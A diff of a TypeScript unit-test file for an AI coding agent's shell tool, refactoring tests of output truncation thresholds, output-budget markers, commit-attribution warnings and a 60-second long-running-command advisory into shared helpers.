+          expect.objectContaining({ threshold: 30_000 }),
+        );
       });
 
       it('keeps 40k model-facing output when the explicit threshold is 100k', async () => {
-        (
-          mockConfig.isTruncateToolOutputThresholdExplicit as Mock
-        ).mockReturnValue(true);
-        (mockConfig.getTruncateToolOutputThreshold as Mock).mockReturnValue(
-          100_000,
-        );
+        setExplicitThreshold(100_000);
         const output = 'x'.repeat(40_000);
-        const invocation = shellTool.build({
-          command: 'large-output-cmd',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        resolveShellExecution({ output, exitCode: 0 });
+        const result = await runFg('large-output-cmd', { output, exitCode: 0 });
 
-        const result = await promise;
-
-        expect(result.llmContent).toContain(output);
-        expect(result.llmContent).not.toContain(
-          'Tool output was too large and has been truncated',
-        );
+        expectText(result.llmContent, [output], [TRUNCATED]);
         expect(result.persistedOutputFiles).toBeUndefined();
       });
 
+      it('does not persist a raw capture preview as full output', async () => {
+        const truncationModule = await import('./truncation.js');
+        const spy = vi
+          .spyOn(truncationModule, 'truncateToolOutput')
+          .mockResolvedValue({
+            content: 'Full output saved to /tmp/preview.output; use read_file.',
+            outputFile: '/tmp/preview.output',
+          });
+        const capture: ShellRawCaptureSink = {
+          write: vi.fn().mockResolvedValue(undefined),
+          finish: vi.fn().mockResolvedValue(undefined),
+          setStarted: vi.fn(),
+          setProcessResult: vi.fn(),
+        };
+        const output = 'x'.repeat(64 * 1024);
+        try {
+          const invocation = shellTool.build({
+            command: 'large-output-cmd',
+            is_background: false,
+          }) as ShellToolInvocation;
+          const pending = invocation.execute(
+            mockAbortSignal,
+            undefined,
+            undefined,
+            undefined,
+            undefined,
+            undefined,
+            capture,
+          );
+          resolveShellExecution({ output, exitCode: 0 });
+          const result = await pending;
+
+          expect(spy).not.toHaveBeenCalled();
+          expect(result.llmContent).toContain(output);
+          expect(result.llmContent).not.toContain('/tmp/preview.output');
+          expect(result.llmContent).not.toContain('read_file');
+          expect(result.persistedOutputFiles).toBeUndefined();
+          expect(result.returnDisplay).toMatchObject({ outputFiles: [] });
+          expect(mockShellExecutionService.mock.calls[0][5]).toMatchObject({
+            maxBufferedOutputBytes: 64 * 1024,
+          });
+          expect(capture.setProcessResult).toHaveBeenCalledWith(
+            expect.objectContaining({ output, exitCode: 0 }),
+          );
+        } finally {
+          spy.mockRestore();
+        }
+      });
+
       it('passes an explicit low threshold to output truncation', async () => {
-        (
-          mockConfig.isTruncateToolOutputThresholdExplicit as Mock
-        ).mockReturnValue(true);
-        (mockConfig.getTruncateToolOutputThreshold as Mock).mockReturnValue(
-          10_000,
-        );
+        setExplicitThreshold(10_000);
         const outputFile = '/tmp/qwen-temp/shell-output.txt';
         const truncatedContent =
           'Tool output was too large and has been truncated.';
-        const truncationModule = await import('./truncation.js');
-        const spy = vi
-          .spyOn(truncationModule, 'truncateToolOutput')
-          .mockResolvedValue({ content: truncatedContent, outputFile });
+        const spy = await spyTruncation({
+          content: truncatedContent,
+          outputFile,
+        });
 
-        try {
-          const invocation = shellTool.build({
-            command: 'large-output-cmd',
-            is_background: false,
-          });
-          const promise = invocation.execute(mockAbortSignal);
-          resolveShellExecution({ output: 'x'.repeat(15_000), exitCode: 0 });
+        const result = await runFg('large-output-cmd', {
+          output: 'x'.repeat(15_000),
+        });
 
-          const result = await promise;
-
-          expect(spy).toHaveBeenCalledWith(
-            mockConfig,
-            ShellTool.Name,
-            expect.any(String),
-            expect.objectContaining({
-              threshold: 10_000,
-              previewChars: 4000,
-              lines: Number.POSITIVE_INFINITY,
-            }),
-          );
-          expect(result.llmContent).toContain(truncatedContent);
-          expect(result.persistedOutputFiles).toEqual([outputFile]);
-        } finally {
-          spy.mockRestore();
-        }
+        expect(spy).toHaveBeenCalledWith(
+          mockConfig,
+          ShellTool.Name,
+          expect.any(String),
+          expect.objectContaining({
+            threshold: 10_000,
+            previewChars: 4000,
+            lines: Number.POSITIVE_INFINITY,
+          }),
+        );
+        expect(result.llmContent).toContain(truncatedContent);
+        expect(result.persistedOutputFiles).toEqual([outputFile]);
+        expect(result.returnDisplay).toMatchObject({
+          outputFiles: [outputFile],
+        });
       });
 
       it('limits the preview budget to an explicit threshold below 4k', async () => {
-        (
-          mockConfig.isTruncateToolOutputThresholdExplicit as Mock
-        ).mockReturnValue(true);
-        (mockConfig.getTruncateToolOutputThreshold as Mock).mockReturnValue(
-          1000,
+        setExplicitThreshold(1000);
+        const spy = await spyTruncation();
+
+        await runFg('large-output-cmd', { output: 'x'.repeat(5000) });
+
+        expect(spy).toHaveBeenCalledWith(
+          mockConfig,
+          ShellTool.Name,
+          expect.any(String),
+          expect.objectContaining({ threshold: 1000, previewChars: 1000 }),
         );
-        const truncationModule = await import('./truncation.js');
-        const spy = vi
-          .spyOn(truncationModule, 'truncateToolOutput')
-          .mockImplementation(async (_config, _toolName, content) => ({
-            content,
-          }));
-
-        try {
-          const invocation = shellTool.build({
-            command: 'large-output-cmd',
-            is_background: false,
-          });
-          const promise = invocation.execute(mockAbortSignal);
-          resolveShellExecution({ output: 'x'.repeat(5000), exitCode: 0 });
-
-          await promise;
-
-          expect(spy).toHaveBeenCalledWith(
-            mockConfig,
-            ShellTool.Name,
-            expect.any(String),
-            expect.objectContaining({
-              threshold: 1000,
-              previewChars: 1000,
-            }),
-          );
-        } finally {
-          spy.mockRestore();
-        }
       });
 
       describe('outputBudgetApplied', () => {
-        // The scheduler's generic spill gate sits at the GLOBAL threshold
-        // (25k default) + 3k headroom ≈ 28k, below this tool's own 30k budget.
-        // Output in that window is inside Shell's budget, so the marker has to
-        // be set even when nothing was cut — otherwise the gate re-bounds the
-        // body under a stricter head-only policy and the surviving preview
-        // collapses from the whole output to a short head.
+        // The scheduler's generic spill gate sits at the GLOBAL threshold (25k
+        // default) + 3k headroom ≈ 28k, below Shell's 30k budget. Output in
+        // that window needs the marker even when nothing was cut, or the gate
+        // re-bounds it head-only and the preview collapses to a short head.
         it('marks a body that fits the threshold, leaving it untouched', async () => {
           const output = 'x'.repeat(29_000);
-          const invocation = shellTool.build({
-            command: 'mid-output-cmd',
-            is_background: false,
-          });
-          const promise = invocation.execute(mockAbortSignal);
-          resolveShellExecution({ output, exitCode: 0 });
-
-          const result = await promise;
+          const result = await runFg('mid-output-cmd', { output, exitCode: 0 });
 
           expect(result.outputBudgetApplied).toBe(true);
           expect(result.llmContent).toContain(output);
@@ -4001,14 +3061,10 @@ describe('ShellTool', () => {
         });
 
         it('marks a body that exceeded the threshold', async () => {
-          const invocation = shellTool.build({
-            command: 'large-output-cmd',
-            is_background: false,
+          const result = await runFg('large-output-cmd', {
+            output: 'x'.repeat(35_000),
+            exitCode: 0,
           });
-          const promise = invocation.execute(mockAbortSignal);
-          resolveShellExecution({ output: 'x'.repeat(35_000), exitCode: 0 });
-
-          const result = await promise;
 
           expect(result.outputBudgetApplied).toBe(true);
         });
@@ -4016,410 +3072,170 @@ describe('ShellTool', () => {
         // The scheduler skips its error gate only when `error.message` is still
         // byte-for-byte the marked body, so this identity is load-bearing.
         it('marks a non-zero exit and reports the same text as error.message', async () => {
-          const invocation = shellTool.build({
-            command: 'failing-cmd',
-            is_background: false,
+          const result = await runFg('failing-cmd', {
+            output: 'y'.repeat(29_000),
+            exitCode: 1,
           });
-          const promise = invocation.execute(mockAbortSignal);
-          resolveShellExecution({ output: 'y'.repeat(29_000), exitCode: 1 });
-
-          const result = await promise;
 
           expect(result.outputBudgetApplied).toBe(true);
           expect(result.error?.message).toBe(result.llmContent);
         });
 
         it('leaves an explicit background launch unmarked', async () => {
-          const invocation = shellTool.build({
-            command: 'sleep 100',
-            is_background: true,
-          });
+          const result = await runBg('sleep 100');
 
-          const result = await invocation.execute(mockAbortSignal);
-
-          // Assert the background receipt first: `toBeUndefined` alone would
-          // also pass for a result that never reached this path.
+          // Assert the receipt first: `toBeUndefined` alone would also pass
+          // for a result that never reached this path.
           expect(result.llmContent).toContain('Background shell started.');
           expect(result.outputBudgetApplied).toBeUndefined();
         });
 
         it('marks a timed-out foreground body carrying the partial output', async () => {
-          // The scheduler's timeout branch stands its generic gate down for a
-          // marked body, so the marker on `llmContent` is the single thing
-          // deciding whether a ~29k timed-out body reaches the model whole.
+          // The scheduler's timeout branch stands its gate down for a marked
+          // body, so the marker alone decides whether a ~29k timed-out body
+          // reaches the model whole.
           const partial = 'x'.repeat(29_000);
-          const invocation = shellTool.build({
-            command: 'long-running-command',
-            is_background: false,
-            timeout: 5000,
-          });
-          const mockCombinedSignal = {
-            aborted: true,
-            reason: new DOMException('timed out', 'TimeoutError'),
-            addEventListener: vi.fn(),
-            removeEventListener: vi.fn(),
-          } as unknown as AbortSignal;
-          const originalAbortSignal = globalThis.AbortSignal;
-          vi.stubGlobal('AbortSignal', {
-            ...originalAbortSignal,
-            timeout: vi.fn().mockReturnValue(mockCombinedSignal),
-            any: vi.fn().mockReturnValue(mockCombinedSignal),
-          });
+          stubAbortSignal(timedOutSignal());
 
-          try {
-            const promise = invocation.execute(mockAbortSignal);
-            resolveShellExecution({
-              output: partial,
-              exitCode: null,
-              aborted: true,
-            });
-            const result = await promise;
+          const result = await runFg(
+            'long-running-command',
+            { output: partial, exitCode: null, aborted: true },
+            { timeout: 5000 },
+          );
 
-            expect(result.error?.type).toBe(ToolErrorType.EXECUTION_TIMEOUT);
-            expect(result.outputBudgetApplied).toBe(true);
-            expect(result.llmContent).toContain(partial);
-            // The timeout error.message is deliberately the short summary
-            // alone, so the marker is the only bound signal on this path.
-            expect(result.error?.message).not.toBe(result.llmContent);
-          } finally {
-            vi.stubGlobal('AbortSignal', originalAbortSignal);
-          }
+          expect(result.error?.type).toBe(ToolErrorType.EXECUTION_TIMEOUT);
+          expect(result.outputBudgetApplied).toBe(true);
+          expect(result.llmContent).toContain(partial);
+          // The timeout error.message is deliberately the short summary alone,
+          // so the marker is the only bound signal on this path.
+          expect(result.error?.message).not.toBe(result.llmContent);
         });
 
         it('reserves the appended advisory out of the body budget', async () => {
-          // The long-run advisory is appended AFTER the in-tool sizing, so its
-          // size comes out of the body budget: the assembled string must still
-          // fit the declared 30k budget, or the scheduler's per-tool pass
-          // would re-bound it under a second policy. A formatted body in the
-          // (budget - advisory, budget] band is sized as over-budget instead.
-          // (The formatted body adds a ~100-char Command/Directory/Exit-Code
-          // header over the raw output, so 29_700 lands in the band.)
-          vi.useFakeTimers({ toFake: ['Date', 'performance'] });
-          try {
-            const output = 'x'.repeat(29_700);
-            const invocation = shellTool.build({
-              command: 'mid-output-cmd',
-              is_background: false,
-            });
-            const promise = invocation.execute(mockAbortSignal);
-            // Advance past the 60s advisory threshold so the hint appends.
-            await vi.advanceTimersByTimeAsync(60_000);
-            resolveShellExecution({ output, exitCode: 0 });
-            const result = await promise;
+          // The long-run advisory is appended AFTER in-tool sizing, so it comes
+          // out of the body budget; otherwise the per-tool pass re-bounds the
+          // assembled string under a second policy. The ~100-char header puts
+          // 29_700 in the (budget - advisory, budget] band sized as over-budget.
+          const output = 'x'.repeat(29_700);
+          const result = await runPastAdvisory(output);
 
-            expect(result.outputBudgetApplied).toBe(true);
-            expect(result.llmContent).toContain(
-              'this foreground command ran for 60s',
-            );
-            // Without the reservation the body would fit whole here and the
-            // advisory would push the assembled string past the budget.
-            expect(result.llmContent).not.toContain(output);
-            expect(String(result.llmContent).length).toBeLessThanOrEqual(
-              30_000,
-            );
-          } finally {
-            vi.useRealTimers();
-          }
+          expect(result.outputBudgetApplied).toBe(true);
+          // Without the reservation the body would fit whole and the advisory
+          // would push the assembled string past the budget.
+          expectText(result.llmContent, [ADVISORY], [output]);
+          expect(String(result.llmContent).length).toBeLessThanOrEqual(30_000);
         });
 
         it('reserves the appended attribution warning out of the body budget', async () => {
-          // The attribution warning is the other half of the reservation: it
-          // is appended after the in-tool sizing, so a commit body that fits
-          // the declared 30k budget on its own but not together with the
-          // warning must be sized as over-budget here — otherwise the
-          // assembled string exceeds the budget the marker vouches for. The
-          // formatted header adds ~121 chars over the raw output, so 29,850
-          // lands the body inside the (budget - warning, budget] band.
-          const preSha = 'a'.repeat(40);
-          const postSha = 'b'.repeat(40);
+          // The attribution warning is the other appended half: a commit body
+          // that fits 30k alone but not with the warning must be sized as
+          // over-budget, or the assembled string exceeds what the marker
+          // vouches for. The ~121-char header puts 29,850 in that band.
           const longMessage = `notes exploded: ${'x'.repeat(300)}`;
-
-          // attachCommitAttribution's git probes go through
-          // childProcess.execFile: HEAD moved (pre -> post) and exactly one
-          // commit landed.
-          mockExecFile.mockImplementation(
-            (
-              _file: unknown,
-              args: unknown,
-              _options: unknown,
-              callback: (
-                error: Error | null,
-                stdout: string,
-                stderr: string,
-              ) => void,
-            ) => {
-              const argv = args as string[];
-              const joined = argv.join(' ');
-              const respond =
-                joined === 'rev-parse HEAD'
-                  ? `${postSha}\n`
-                  : joined.startsWith('rev-list --count')
-                    ? '1\n'
-                    : null;
-              queueMicrotask(() =>
-                respond === null
-                  ? callback(
-                      new Error(`unexpected git call: ${joined}`),
-                      '',
-                      '',
-                    )
-                  : callback(null, respond, ''),
-              );
-              return { on: vi.fn() };
-            },
-          );
-
-          // The diff analysis goes through the (mocked)
-          // ShellExecutionService: the main commit command gets the deferred
-          // result, the runGit probes get canned per-subcommand output.
-          mockShellExecutionService.mockImplementation((cmd: string) => {
-            if (cmd.startsWith('git commit')) {
-              return {
-                pid: 12345,
-                result: new Promise<ShellExecutionResult>((resolve) => {
-                  resolveExecutionPromise = resolve;
-                }),
-              };
-            }
-            const probeOutput = cmd.includes('rev-parse --verify')
-              ? `${preSha}\n`
-              : cmd.includes('log -1 --pretty=%P')
-                ? `${preSha}\n`
-                : cmd.includes('rev-parse --show-toplevel')
-                  ? '/test/dir\n'
-                  : cmd.includes('--name-only')
-                    ? 'file.txt\n'
-                    : cmd.includes('--name-status')
-                      ? 'M\tfile.txt\n'
-                      : cmd.includes('--numstat')
-                        ? '1\t0\tfile.txt\n'
-                        : '';
-            return {
-              pid: 12345,
-              result: Promise.resolve({
-                rawOutput: Buffer.from(probeOutput),
-                output: probeOutput,
-                exitCode: 0,
-                signal: null,
-                error: null,
-                aborted: false,
-                pid: 12345,
-                executionMethod: 'child_process',
-              } as ShellExecutionResult),
-            };
-          });
-
-          // One AI-touched file to attribute, then the note payload build
-          // throws so the catch branch produces the warning.
-          const attributionService = CommitAttributionService.getInstance();
-          vi.spyOn(attributionService, 'hasAttributions').mockReturnValue(true);
-          vi.spyOn(attributionService, 'matchCommittedFiles').mockReturnValue(
-            new Set(['/test/dir/file.txt']),
-          );
-          vi.spyOn(
-            attributionService,
-            'generateNotePayload',
-          ).mockImplementation(() => {
-            throw new Error(longMessage);
-          });
-
           const output = 'x'.repeat(29_850);
-          const invocation = shellTool.build({
-            command: 'git commit -m "x"',
-            is_background: false,
-          });
-          const promise = invocation.execute(mockAbortSignal);
-          await vi.waitFor(() =>
-            expect(mockShellExecutionService).toHaveBeenCalled(),
-          );
-          resolveExecutionPromise({
-            rawOutput: Buffer.from(output),
-            output,
-            exitCode: 0,
-            signal: null,
-            error: null,
-            aborted: false,
-            pid: 12345,
-            executionMethod: 'child_process',
-          });
-          const result = await promise;
+          const result = await commitWithNoteFailure(longMessage, output);
 
           expect(result.outputBudgetApplied).toBe(true);
           expect(result.llmContent).toContain(
             `AI attribution note skipped: ${longMessage.slice(0, 120)}.`,
           );
-          // The reservation sized the body as over-budget: the raw output is
-          // gone, the sentinel is present, and the assembled string (body +
-          // warning) still fits the declared budget.
+          // Sized as over-budget: raw output gone, sentinel present, and body +
+          // warning still fits the declared budget.
           expect(String(result.llmContent)).not.toContain(output);
-          expect(result.llmContent).toContain(
-            'Tool output was too large and has been truncated',
-          );
+          expect(result.llmContent).toContain(TRUNCATED);
           expect(String(result.llmContent).length).toBeLessThanOrEqual(30_000);
         });
 
         it('still delivers a band-fitting body whole with the advisory', async () => {
-          // Guard against the reservation over-shrinking: a body comfortably
-          // under budget-minus-advisory is delivered whole, advisory included.
-          vi.useFakeTimers({ toFake: ['Date', 'performance'] });
-          try {
-            const output = 'x'.repeat(29_000);
-            const invocation = shellTool.build({
-              command: 'mid-output-cmd',
-              is_background: false,
-            });
-            const promise = invocation.execute(mockAbortSignal);
-            await vi.advanceTimersByTimeAsync(60_000);
-            resolveShellExecution({ output, exitCode: 0 });
-            const result = await promise;
+          // Guards against over-shrinking: a body comfortably under
+          // budget-minus-advisory is delivered whole, advisory included.
+          const output = 'x'.repeat(29_000);
+          const result = await runPastAdvisory(output);
 
-            expect(result.outputBudgetApplied).toBe(true);
-            expect(result.llmContent).toContain(output);
-            expect(result.llmContent).toContain(
-              'this foreground command ran for 60s',
-            );
-            expect(result.llmContent).not.toContain(
-              'Tool output was too large and has been truncated',
-            );
-            expect(String(result.llmContent).length).toBeLessThanOrEqual(
-              30_000,
-            );
-          } finally {
-            vi.useRealTimers();
-          }
+          expect(result.outputBudgetApplied).toBe(true);
+          expectText(result.llmContent, [output, ADVISORY], [TRUNCATED]);
+          expect(String(result.llmContent).length).toBeLessThanOrEqual(30_000);
         });
 
         it('keeps a sub-advisory explicit threshold from disarming the pass it marks', async () => {
-          // Regression: the reservation subtracts the advisory size from the
-          // declared threshold. An explicit `truncateToolOutputThreshold`
-          // below the advisory length (the setting has no schema minimum)
-          // drove the in-tool threshold non-positive, and truncateToolOutput
-          // returns the body untouched on `threshold <= 0` — while the
-          // unconditional marker still vouched for it, standing the
-          // scheduler's failure-path gate down with nothing behind it. The
-          // clamp keeps the pass running so the marker never attests to a
-          // sizing that did not happen.
-          (
-            mockConfig.isTruncateToolOutputThresholdExplicit as Mock
-          ).mockReturnValue(true);
-          (mockConfig.getTruncateToolOutputThreshold as Mock).mockReturnValue(
-            100,
-          );
-          vi.useFakeTimers({ toFake: ['Date', 'performance'] });
-          try {
-            const output = 'x'.repeat(5_000);
-            const invocation = shellTool.build({
-              command: 'mid-output-cmd',
-              is_background: false,
-            });
-            const promise = invocation.execute(mockAbortSignal);
-            // Past the 60s advisory threshold so the ~619-char reservation
-            // exceeds the explicit 100-char threshold.
-            await vi.advanceTimersByTimeAsync(60_000);
-            resolveShellExecution({ output, exitCode: 3, error: null });
-            const result = await promise;
+          // Regression: the reservation subtracts the advisory size from an
+          // explicit threshold that can be below it (no schema minimum); at
+          // `threshold <= 0` truncateToolOutput returns the body untouched while
+          // the unconditional marker still vouches for it, standing the
+          // scheduler's failure-path gate down. The clamp keeps the pass running.
+          setExplicitThreshold(100);
+          const output = 'x'.repeat(5_000);
+          // Past 60s, so the ~619-char reservation exceeds the 100-char threshold.
+          const result = await runPastAdvisory(output, 3);
 
-            // The failure-path branch makes error.message BE llmContent, so
-            // the sentinel on the body is the only bound the model sees.
-            expect(result.error?.type).toBe(ToolErrorType.SHELL_EXECUTE_ERROR);
-            expect(result.error?.message).toBe(result.llmContent);
-            expect(result.outputBudgetApplied).toBe(true);
-            expect(result.llmContent).toContain(
-              'Tool output was too large and has been truncated',
-            );
-            expect(String(result.llmContent)).not.toContain(output);
-            expect(result.persistedOutputFiles?.length).toBeGreaterThan(0);
-          } finally {
-            vi.useRealTimers();
-          }
+          // On failure error.message IS llmContent, so the sentinel on the body
+          // is the only bound the model sees.
+          expect(result.error?.type).toBe(ToolErrorType.SHELL_EXECUTE_ERROR);
+          expect(result.error?.message).toBe(result.llmContent);
+          expect(result.outputBudgetApplied).toBe(true);
+          expect(result.llmContent).toContain(TRUNCATED);
+          expect(String(result.llmContent)).not.toContain(output);
+          expect(result.persistedOutputFiles?.length).toBeGreaterThan(0);
         });
 
         it('keeps the exit-code line when the reservation would eat a sub-advisory threshold', async () => {
-          // Companion to the sub-advisory pin above: at an explicit 600-char
-          // threshold the ~620-char advisory reservation alone would consume
-          // the whole body budget, leaving a 1-char preview whose head-and-tail
-          // keeps neither the rows nor the trailing `Exit Code:` line. The
-          // reservation is capped at half the threshold, so the tail preview
-          // keeps the exit-code line.
-          (
-            mockConfig.isTruncateToolOutputThresholdExplicit as Mock
-          ).mockReturnValue(true);
-          (mockConfig.getTruncateToolOutputThreshold as Mock).mockReturnValue(
-            600,
-          );
-          vi.useFakeTimers({ toFake: ['Date', 'performance'] });
-          try {
-            const output = 'x'.repeat(5_000);
-            const invocation = shellTool.build({
-              command: 'mid-output-cmd',
-              is_background: false,
-            });
-            const promise = invocation.execute(mockAbortSignal);
-            // Past the 60s advisory threshold so the reservation fires.
-            await vi.advanceTimersByTimeAsync(60_000);
-            resolveShellExecution({ output, exitCode: 3, error: null });
-            const result = await promise;
+          // Companion pin: at an explicit 600-char threshold the ~620-char
+          // reservation would leave a 1-char preview keeping neither the rows
+          // nor the trailing `Exit Code:` line. Capping the reservation at half
+          // the threshold keeps the exit-code line in the tail preview.
+          setExplicitThreshold(600);
+          const output = 'x'.repeat(5_000);
+          const result = await runPastAdvisory(output, 3);
 
-            expect(result.outputBudgetApplied).toBe(true);
-            expect(result.llmContent).toContain(
-              'this foreground command ran for 60s',
-            );
-            expect(result.llmContent).toContain(
-              'Tool output was too large and has been truncated',
-            );
-            expect(String(result.llmContent)).not.toContain(output);
-            expect(result.llmContent).toContain('Exit Code: 3');
-          } finally {
-            vi.useRealTimers();
-          }
+          expect(result.outputBudgetApplied).toBe(true);
+          expectText(result.llmContent, [ADVISORY, TRUNCATED]);
+          expect(String(result.llmContent)).not.toContain(output);
+          expect(result.llmContent).toContain('Exit Code: 3');
         });
       });
+    });
+
+    it('preserves full successful display for hooks before preview compaction', async () => {
+      const output =
+        'A'.repeat(20_000) + '\nHOOK_MIDDLE_SENTINEL\n' + 'B'.repeat(20_000);
+      const result = await runFg('printf large-output', {
+        output,
+        exitCode: 0,
+      });
+
+      expect(result.error).toBeUndefined();
+      expect(shellResultText(result.returnDisplay)).toContain(output);
+      expect(result.returnDisplay).toMatchObject({
+        output,
+        truncated: false,
+      });
+      expect(result.outputBudgetApplied).toBe(true);
+      expect(result.persistedOutputFiles?.length).toBeGreaterThan(0);
+      expect(result.llmContent).not.toContain('HOOK_MIDDLE_SENTINEL');
     });
 
     it('retains shell truncation without an artifact and records the persistence decision', async () => {
       const originalOutput = 'A'.repeat(30_001);
       const shortenedContent =
         'Tool output was too large and has been truncated.\n[mocked truncated body]\n[Note: Could not save full output to file]';
-      const truncationModule = await import('./truncation.js');
-      const spy = vi
-        .spyOn(truncationModule, 'truncateToolOutput')
-        .mockResolvedValue({ content: shortenedContent });
+      await spyTruncation({ content: shortenedContent });
 
-      try {
-        const invocation = shellTool.build({
-          command: 'large-output-cmd',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        resolveShellExecution({ output: originalOutput, exitCode: 0 });
-        const result = await promise;
+      const result = await runFg('large-output-cmd', {
+        output: originalOutput,
+      });
 
-        expect(result.llmContent).toContain(shortenedContent);
-        expect(result.llmContent).not.toContain(originalOutput);
-        expect(result.persistedOutputFiles).toEqual([]);
-      } finally {
-        spy.mockRestore();
-      }
+      expectText(result.llmContent, [shortenedContent], [originalOutput]);
+      expect(result.persistedOutputFiles).toEqual([]);
     });
 
     describe('long-running foreground hint', () => {
-      // Auto-bg advisory. Threshold = effectiveTimeout / 2 — for the
-      // default 120s timeout that's 60_000ms, which the tests below
-      // assume. Tests use vi fake timers to drive the wall-clock past
-      // the threshold without actually sleeping. Hint must fire on
-      // success AND error completions (advice is the same), suppress
-      // on user-cancel / timeout / external signal (their own
-      // messaging is enough), and never fire on the background path
-      // (returns before the threshold by construction).
-      //
-      // Faking BOTH `Date` and `performance` here — shell.ts uses
-      // `performance.now()` (monotonic, NTP-resilient) for the
-      // long-run elapsed measurement, so without faking performance
-      // the elapsed would always read as "near zero" under
-      // `advanceTimersByTimeAsync` and the hint tests would never
-      // fire. Date stays faked so that `lastUpdateTime = Date.now()`
-      // (streaming throttle) and other Date-based callers in the
-      // execute path also stay deterministic.
+      // Auto-bg advisory at effectiveTimeout / 2 (60_000ms for the default
+      // 120s, assumed below): fires on success AND error, is suppressed on
+      // user-cancel / timeout / external signal (own messaging), never fires
+      // on the background path. `performance` is faked because shell.ts times
+      // with monotonic `performance.now()` (near zero under
+      // `advanceTimersByTimeAsync` otherwise); `Date` keeps the streaming
+      // throttle's `lastUpdateTime` and other Date callers deterministic.
       beforeEach(() => {
         vi.useFakeTimers({ toFake: ['Date', 'performance'] });
       });
@@ -4427,1153 +3243,514 @@ describe('ShellTool', () => {
         vi.useRealTimers();
       });
 
-      it('appends the long-run hint when a foreground command runs ≥ 60s', async () => {
-        const invocation = shellTool.build({
-          command: 'pytest -q',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        // Advance the wall-clock past the 60s threshold.
-        await vi.advanceTimersByTimeAsync(60_000);
-        resolveShellExecution({ output: 'all green', exitCode: 0 });
-        const result = await promise;
-        expect(result.llmContent).toContain(
-          'this foreground command ran for 60s',
+      const HINT = 'foreground command ran for';
+
+      /** runFg that advances `advanceMs` of fake time before settling. */
+      /** runFg after `advanceMs` of fake time; a string `result` is a clean exit's output. */
+      const runFor = (
+        advanceMs: number,
+        command: string,
+        result: string | Partial<ShellExecutionResult>,
+        params: Partial<ShellToolParams> = {},
+      ) =>
+        runFg(
+          command,
+          typeof result === 'string' ? { output: result } : result,
+          { advanceMs, ...params },
         );
-        expect(result.llmContent).toContain('is_background: true');
-        expect(result.llmContent).toContain('/tasks');
+
+      /** Asserts the 60s advisory reached both the model and the user's display. */
+      const expectHintShown = (result: ToolResult) => {
+        expect(result.returnDisplay).toMatchObject({
+          type: 'shell_result',
+          version: 1,
+          outcome: 'completed',
+          notices: [expect.stringContaining(`${HINT} 60s`)],
+        });
+        expect(result.llmContent).toContain(`${HINT} 60s`);
+      };
+
+      it('appends the long-run hint when a foreground command runs ≥ 60s', async () => {
+        const result = await runFor(60_000, 'pytest -q', 'all green');
+        expectText(result.llmContent, [
+          'this foreground command ran for 60s',
+          'is_background: true',
+          '/tasks',
+        ]);
       });
 
       it('appends the hint when a successful foreground command with empty output runs ≥ 60s', async () => {
-        // Empty-output success: write-only commands (e.g. `tar czf …`,
-        // `cp -r large-dir/`, `dd if=…`) frequently produce no stdout
-        // and exit 0. The non-debug `returnDisplayMessage` build leaves
-        // the message as `''` in this branch (output empty, exitCode 0,
-        // no abort/signal/error), so the hint append is the only thing
-        // that ever populates the user-facing TUI line. Pin both that
-        // the hint reaches the LLM AND that it surfaces in the user's
-        // returnDisplay even when the command produced nothing else to
-        // show — the user is the one who waited 60s, they should see
-        // the same advisory the agent does.
-        const invocation = shellTool.build({
-          command: 'write-to-disk.sh',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        await vi.advanceTimersByTimeAsync(65_000);
-        resolveShellExecution({ output: '', exitCode: 0 });
-        const result = await promise;
-        expect(result.llmContent).toContain('foreground command ran for 65s');
-        expect(result.returnDisplay).toContain(
-          'foreground command ran for 65s',
-        );
+        // Write-only commands (`tar czf`, `cp -r`, `dd`) often exit 0 silently,
+        // leaving the non-debug `returnDisplayMessage` '': the hint is the only
+        // TUI line, and the user who waited 60s should see it too.
+        const result = await runFor(65_000, 'write-to-disk.sh', '');
+        expect(result.llmContent).toContain(`${HINT} 65s`);
+        expect(shellResultText(result.returnDisplay)).toContain(`${HINT} 65s`);
       });
 
       it('omits the hint when a foreground command finishes under threshold', async () => {
-        const invocation = shellTool.build({
-          command: 'echo hi',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        await vi.advanceTimersByTimeAsync(5_000);
-        resolveShellExecution({ output: 'hi', exitCode: 0 });
-        const result = await promise;
-        expect(result.llmContent).not.toContain('foreground command ran for');
-        expect(result.llmContent).not.toContain('is_background: true');
+        const result = await runFor(5_000, 'echo hi', 'hi');
+        expectText(result.llmContent, [], [HINT, 'is_background: true']);
       });
 
       it('appends the hint when a long-running foreground command exits non-zero', async () => {
-        // Non-zero exit (without spawn error) is the common "command
-        // ran but failed" shape. `ShellExecutionResult.error` is
-        // reserved for spawn/setup failures (see the doc on the field
-        // in shellExecutionService.ts) — exit-code-N completions leave
-        // `error: null` and `exitCode: N`. The agent still got blocked
-        // for >60s on something that errored; "next time background
-        // it" is exactly the right advice for either failure shape.
-        const invocation = shellTool.build({
-          command: 'flaky.sh',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        await vi.advanceTimersByTimeAsync(75_000);
-        resolveShellExecution({
+        // "Ran but failed": `error` is reserved for spawn/setup failures (see
+        // shellExecutionService.ts), so exit N leaves `error: null`. Blocked
+        // >60s on a failure, "background it next time" still applies.
+        const result = await runFor(75_000, 'flaky.sh', {
           output: '',
           exitCode: 1,
-          error: null, // realistic shape: non-zero exit, no spawn error
+          error: null,
         });
-        const result = await promise;
-        expect(result.llmContent).toContain('Exit Code: 1');
-        expect(result.llmContent).toContain(
+        expectText(result.llmContent, [
+          'Exit Code: 1',
           'this foreground command ran for 75s',
-        );
+        ]);
       });
 
       it('omits the hint on aborted commands (timeout / user-cancel paths surface their own messaging)', async () => {
-        // `tail -f` (not `sleep N`) so the sleep-interception validator
-        // doesn't reject the command at build-time before we even reach
-        // the long-run hint logic.
-        const invocation = shellTool.build({
-          command: 'tail -f /tmp/never.log',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        await vi.advanceTimersByTimeAsync(120_000);
-        resolveShellExecution({
+        // `tail -f`, not `sleep N`, so the sleep validator doesn't reject it at
+        // build time.
+        const result = await runFor(120_000, 'tail -f /tmp/never.log', {
           output: '',
           exitCode: null,
           aborted: true,
         });
-        const result = await promise;
-        expect(result.llmContent).toContain('Command was cancelled');
-        expect(result.llmContent).not.toContain('foreground command ran for');
+        expectText(result.llmContent, ['Command was cancelled'], [HINT]);
       });
 
